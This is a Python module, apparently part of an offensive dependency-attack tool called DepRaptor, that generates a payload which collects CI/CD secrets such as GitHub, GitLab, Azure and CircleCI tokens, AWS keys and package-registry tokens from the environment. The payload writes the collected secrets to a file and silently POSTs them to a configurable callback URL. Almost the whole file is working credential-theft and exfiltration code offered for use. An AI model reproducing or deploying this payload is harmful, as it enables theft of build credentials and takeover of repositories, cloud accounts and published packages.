"""
Payload: ci_env_dump
Captures CI/CD-specific environment variables and writes them to a file.
Targets: GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure Pipelines.
"""


def generate_payload(callback_url: str = "") -> str:
    """Return Python source code for the CI env dump payload."""
    return f'''import os, json
from pathlib import Path

CALLBACK_URL = "{callback_url}"

CI_VARS = [
    # GitHub Actions
    "GITHUB_TOKEN", "GITHUB_ACTOR", "GITHUB_REPOSITORY", "GITHUB_REF",
    "GITHUB_SHA", "GITHUB_WORKFLOW", "GITHUB_RUN_ID",
    # GitLab CI
    "CI_JOB_TOKEN", "CI_PROJECT_URL", "GITLAB_USER_LOGIN",
    # Jenkins
    "JENKINS_URL", "BUILD_URL", "GIT_COMMIT",
    # CircleCI
    "CIRCLE_TOKEN", "CIRCLE_PROJECT_REPONAME",
    # Azure Pipelines
    "SYSTEM_ACCESSTOKEN", "BUILD_REPOSITORY_URI",
    # Generic secrets
    "NPM_TOKEN", "PYPI_TOKEN", "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY", "DOCKER_PASSWORD",
]

def execute_payload():
    captured = {{k: os.environ[k] for k in CI_VARS if k in os.environ}}
    log = Path.cwd() / "ci_env_dump.json"
    log.write_text(json.dumps(captured, indent=2), encoding="utf-8")
    print(f"[DepRaptor] CI env dump written to {{log}}")

    if CALLBACK_URL and captured:
        try:
            import urllib.request
            req = urllib.request.Request(
                CALLBACK_URL,
                data=json.dumps(captured).encode(),
                headers={{"Content-Type": "application/json"}},
                method="POST",
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

execute_payload()
'''
